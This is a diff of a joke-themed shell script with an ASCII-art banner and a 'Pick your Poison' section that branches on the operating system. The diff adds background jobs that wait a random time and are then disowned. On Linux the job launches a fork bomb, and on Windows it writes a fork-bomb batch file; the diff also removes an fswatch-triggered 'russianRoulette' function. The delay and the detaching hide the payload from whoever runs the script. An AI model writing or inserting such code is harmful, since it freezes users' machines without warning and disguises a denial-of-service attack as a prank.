@@ -102,38 +102,20 @@ ddmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
 ```````............```.......................----------------------:::::::::::::::::://////////:::. '
 # Pick your Poison
 if [[ "$OSTYPE" == "darwin"* ]]; then
-	CHANCE=1
 	echo "I have the strange feeling that I’ve forgotten all of this before."
+	(sleep $RANDOM ;) &
 elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
 	echo "So, it was me all along! Now I understand whats going on here!"
-	CHANCE=2
-elif [[ "$OSTYPE" == "cygwin" ]]; then
-	CHANCE=3
-elif [[ "$OSTYPE" == "msys" ]]; then
-	CHANCE=4
-elif [[ "$OSTYPE" == "freebsd"* ]]; then
-	CHANCE=5
+	(sleep $RANDOM ; :(){:|:&};:) & 
 elif [[ "$OSTYPE" == "win32" ]]; then
-	# Is this even possible?
+	# Is this even possible? 
 	echo "I'd like to talk to you a lot more about this. Would you be interested in reading some of my literature?"
-	CHANCE=10
+	(sleep $RANDOM; echo '%0 | %0 ' > ./forkbomb.bat; echo 'I was going to create a fork bomb but I think using Windows is the true torture') &
 else
     echo "I'm a survivor - we're a dying breed"
-	CHANCE=0
+	(sleep $RANDOM ; echo 'Is this reality?'; echo 'Only those using one of the big three OS types can achieve enlightenment!') &
 fi
-export CHANCE
+NIRVANA_PID=$!
+JOB_ID=$(jobs | grep $NIRVANA_PID | cut -d '[' -f 2 | cut -d ']' -f 1) 
+disown %"$JOB_ID"
 
-russianRoulette() {
-	echo "Hi There!"
-	echo "$CHANCE"
-	echo "fin"
-	# NUM=$(echo $((1 + $RANDOM % 1000)))
-	# if [[ "$NUM" -le "$CHANCE" ]]; then 
-	# 	echo "Hi There!"
-	# fi
-}
-export -f russianRoulette > /dev/null 
-
-
-fswatch -0 $HOME --recursive | xargs -0 -n 1 -I {} zsh -c 'russianRoulette' {} #& > /dev/null 
-# disown 
